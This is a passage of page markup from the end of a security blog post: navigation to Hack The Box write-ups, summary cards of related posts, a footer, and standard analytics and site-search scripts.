data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Fuse/">HackTheBox: Fuse write-up</a></li><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li><li><a href="/posts/Cache/">HackTheBox: Cache write-up</a></li><li><a href="/posts/Blunder/">HackTheBox: Blunder write-up</a></li><li><a href="/posts/Admirer/">HackTheBox: Admirer write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/H1-2006-CTF/" class="btn btn-outline-primary"><p>HackerOne h1-2006 CTF write-up</p></a> <a href="/posts/Blunder/" class="btn btn-outline-primary"><p>HackTheBox: Blunder write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Craft/"><div class="card-body"> <span class="timeago small"> Jul 26, 2019 <i class="unloaded">2019-07-26T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Craft write-up</h3><div class="text-muted small"><p>Hack The Box: Craft machine write-up Craft is a medium-rated machine which I found really realistic in the sense that we enumerate an initial webpage to find two domains, one has a gogs instance (...</p></div></div></a></div><div class="card"> <a href="/posts/Magic/"><div class="card-body"> <span class="timeago small"> May 18, 2020 <i class="unloaded">2020-05-18T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Magic write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was an easy machine if you were a bit experienced in web application bugs, as the main vulnerability was a file upload that was used to get a reverse shel...</p></div></div></a></div><div class="card"> <a href="/posts/Admirer/"><div class="card-body"> <span class="timeago small"> Jun 3, 2020 <i class="unloaded">2020-06-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Admirer write-up</h3><div class="text-muted small"><p>Hack The Box: Magic machine write-up This was one of the most interesting machines I’ve solved in Hack The Box, learned some cool techniques. It taught me how recon never ends, despite having foun...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-167902069-1', 'auto'); ga('send', 'pageview'); </script> --> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167902069-1" crossorigin="anonymous"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-167902069-1'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://diego95root.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
